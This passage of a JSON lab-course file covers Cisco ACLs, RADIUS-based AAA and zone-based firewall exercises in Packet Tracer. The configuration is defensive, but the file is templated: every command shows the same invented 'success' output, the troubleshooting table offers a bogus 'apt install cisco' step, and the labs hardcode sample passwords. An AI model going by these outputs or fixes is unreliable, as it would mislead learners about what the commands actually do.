      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 22,
    "week": 11,
    "classNumber": 22,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 11: Spoofing Protections & IP Filtering",
    "title": "Access Control Lists (ACLs)",
    "category": "Firewalling",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Implement strict access control boundaries across internal router interface gateways.",
    "tools": [
      "Cisco Packet Tracer",
      "Extended ACL"
    ],
    "targetEnvironment": "Cisco Packet Tracer: Core Router, Subnets, DMZ",
    "topology": {
      "description": "Lab topology for Access Control Lists (ACLs)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Firewalling",
        "explanation": "Implement strict access control boundaries across internal router interface gateways."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Access Control Lists (ACLs)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: Core Router, Subnets, DMZ.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Access Control Lists (ACLs)",
        "description": "Construct a standard ACL policy sequence to prevent an engineering subnet from establishing sessions inside a finance data segment. Write an Extended Named ACL on an edge router interface that allows only inbound web queries (port 80/443) to reach a DMZ host while dropping all inbound echo query requests (ping).",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "ip access-list extended DMZ_FILTER",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "permit tcp any host 192.168.2.20 eq 80",
            "description": "Execute permit command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "permit tcp any host 192.168.2.20 eq 443",
            "description": "Execute permit command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "deny icmp any any",
            "description": "Execute deny command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "permit ip any any",
            "description": "Execute permit command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "ip access-group DMZ_FILTER in",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          },
          {
            "shell": "cisco",
            "cmd": "show ip access-lists",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment."
          }
        ],
        "verification": "Pings to DMZ host time out (denied); web requests to ports 80/443 succeed; hit counts increment.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: Core Router, Subnets, DMZ",
          "Cisco Packet Tracer",
          "Pings to DMZ host time out (denied); web...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Where should Extended ACLs be placed relative to Standard ACLs for optimal network efficiency?",
        "hint": "Extended ACLs as close to the source as possible; Standard ACLs close to destination."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Access Control Lists (ACLs)?",
      "options": [
        "Implement strict access control boundaries across internal router interface gateways.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Implement strict access control boundaries across internal router interface gateways."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 22.",
    "eli5Story": {
      "title": "The Bouncer with the Guest List (Access Control Lists - ACLs)",
      "analogy": "An ACL is a security guard standing at the door with a clipboard: 'Web traffic on port 80 may come in; Ping echoes are turned away!'"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 22",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: Core Router, Subnets, DMZ"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 23,
    "week": 12,
    "classNumber": 23,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 12: Network Identity & Firewalls",
    "title": "AAA Authentication (RADIUS/TACACS+)",
    "category": "Identity & Access",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Consolidate infrastructure device credentials into a central identity server.",
    "tools": [
      "Cisco Packet Tracer",
      "AAA",
      "RADIUS"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Core Router, 1 AAA Server",
    "topology": {
      "description": "Lab topology for AAA Authentication (RADIUS/TACACS+)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Identity & Access",
        "explanation": "Consolidate infrastructure device credentials into a central identity server."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for AAA Authentication (RADIUS/TACACS+)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Core Router, 1 AAA Server.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: AAA Authentication (RADIUS/TACACS+)",
        "description": "Setup a centralized AAA authentication server profile inside a network topology. Program the terminal lines of core distribution switches and routing interfaces to validate login sequences against the remote database using cryptographic keys, and set up a local fallback path for emergency local access.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "aaa new-model",
            "description": "Execute aaa command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "radius server RADIUS_SRV",
            "description": "Execute radius command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "address ipv4 192.168.1.100 auth-port 1812 acct-port 1813",
            "description": "Execute address command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "key RadiusSecret2026",
            "description": "Execute key command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "aaa authentication login default group radius local",
            "description": "Execute aaa command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "username fallback-admin privilege 15 secret SuperBackup2026",
            "description": "Execute username command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "line vty 0 4",
            "description": "Execute line command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "login authentication default",
            "description": "Execute login command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: VTY logins authenticate against RADIUS server; fallback account works when server is offline."
          }
        ],
        "verification": "VTY logins authenticate against RADIUS server; fallback account works when server is offline.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Core Router, 1 AAA Server",
          "Cisco Packet Tracer",
          "VTY logins authenticate against RADIUS s...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why is TACACS+ often preferred over RADIUS for administrative network device management?",
        "hint": "TACACS+ encrypts the entire packet payload and decouples Authentication from Authorization."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of AAA Authentication (RADIUS/TACACS+)?",
      "options": [
        "Consolidate infrastructure device credentials into a central identity server.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Consolidate infrastructure device credentials into a central identity server."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 23.",
    "eli5Story": {
      "title": "The Central Student ID Office (AAA RADIUS/TACACS+)",
      "analogy": "Instead of having a different lock on 50 doors, every guard calls the Central Office to ask: 'Is Timmy allowed in? What permissions does he have?'"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 23",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Core Router, 1 AAA Server"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 24,
    "week": 12,
    "classNumber": 24,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 12: Network Identity & Firewalls",
    "title": "Zone-Based Policy Firewalls (ZBF)",
    "category": "Firewalling",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Group routing interfaces into logical security environments regulated by inspection engines.",
    "tools": [
      "Cisco Packet Tracer",
      "ZBF",
      "Cisco IOS"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Router, 2 Security Zones",
    "topology": {
      "description": "Lab topology for Zone-Based Policy Firewalls (ZBF)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "Firewalling",
        "explanation": "Group routing interfaces into logical security environments regulated by inspection engines."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Zone-Based Policy Firewalls (ZBF)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Router, 2 Security Zones.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Zone-Based Policy Firewalls (ZBF)",
        "description": "Program an internal router with explicit security boundaries by creating an INSIDE zone and an OUTSIDE zone. Define traffic map classes matching core network communication vectors (TCP/UDP/ICMP). Apply matching inspection rules inside a zone-pair profile to permit stateful internal lookups while dropping uninitiated external entries.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "zone security IN_ZONE",
            "description": "Execute zone command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "zone security OUT_ZONE",
            "description": "Execute zone command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "class-map type inspect match-any PROTOCOLS",
            "description": "Execute class-map command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "match protocol tcp",
            "description": "Execute match command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "match protocol udp",
            "description": "Execute match command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "match protocol icmp",
            "description": "Execute match command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "policy-map type inspect IN_TO_OUT_POLICY",
            "description": "Execute policy-map command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "class type inspect PROTOCOLS",
            "description": "Execute class command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "inspect",
            "description": "Execute inspect command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "class class-default",
            "description": "Execute class command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "drop",
            "description": "Execute drop command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "zone-pair security IN_TO_OUT source IN_ZONE destination OUT_ZONE",
            "description": "Execute zone-pair command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "service-policy type inspect IN_TO_OUT_POLICY",
            "description": "Execute service-policy command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/0",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "zone-member security IN_ZONE",
            "description": "Execute zone-member command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "zone-member security OUT_ZONE",
            "description": "Execute zone-member command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Inside clients initiate connections freely; outside initiated unsolicited traffic dropped."
          }
        ],
        "verification": "Inside clients initiate connections freely; outside initiated unsolicited traffic dropped.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Router, 2 Security Zones",
          "Cisco Packet Tracer",
          "Inside clients initiate connections free...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What makes ZBF stateful compared to standard static Access Control Lists?",
        "hint": "ZBF dynamically creates return state table entries for established connections."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Zone-Based Policy Firewalls (ZBF)?",
      "options": [
        "Group routing interfaces into logical security environments regulated by inspection engines.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Group routing interfaces into logical security environments regulated by inspection engines."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 24.",
    "eli5Story": {
      "title": "The One-Way Playground Turnstile (Zone-Based Firewalls)",
      "analogy": "Kids can walk OUT of the school onto the soccer field, and the turnstile lets them walk back in. But strangers outside can never push the turnstile to walk in uninvited!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 24",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Router, 2 Security Zones"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 25,
    "week": 13,
    "classNumber": 25,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 13: Advanced Firewall Architectures",
    "title": "Cisco ASA Firewall Basics",
    "category": "Firewalling",
    "difficulty": "Advanced",
    "duration": "90 - 120 Mins",
    "objective": "Deploy and run a hardware firewall gateway system at the network edge.",
    "tools": [
      "Cisco Packet Tracer",
      "Cisco ASA 5506-X"
    ],
